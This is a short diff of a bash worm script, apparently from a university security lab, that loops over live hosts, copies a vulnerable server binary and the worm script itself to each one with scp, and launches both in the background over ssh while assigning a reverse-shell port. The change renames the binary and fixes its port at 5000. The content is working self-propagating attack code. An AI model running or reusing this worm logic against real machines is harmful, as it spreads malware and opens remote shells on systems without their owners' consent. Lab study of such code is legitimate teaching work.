@@ -38,7 +38,7 @@ for TARGET in "${ALIVES[@]}"; do
             echo "[+] Found working user: $USER"
 
             # Copy payloads
-            scp /home/wanthinnn/Documents/NT230/Labs/Lab-3/vul_server $USER@$TARGET:/tmp/vulserver &> /dev/null
+            scp /home/wanthinnn/Documents/NT230/Labs/Lab-3/vul_server $USER@$TARGET:/tmp/vul_server &> /dev/null
             scp /tmp/worm.sh $USER@$TARGET:/tmp/worm.sh &> /dev/null
 
             # Assign reverse shell port
@@ -46,8 +46,8 @@ for TARGET in "${ALIVES[@]}"; do
             echo "[*] Assigning reverse shell port: $PORT"
 
             # Execute payloads in background
-            ssh $USER@$TARGET "chmod +x /tmp/vulserver /tmp/worm.sh; \
-                               nohup /tmp/vulserver $PORT >/dev/null 2>&1 & \
+            ssh $USER@$TARGET "chmod +x /tmp/vul_server /tmp/worm.sh; \
+                               nohup /tmp/vul_server 5000 >/dev/null 2>&1 & \
                                sleep 1; \
                                nohup bash /tmp/worm.sh >/dev/null 2>&1 &" &
 
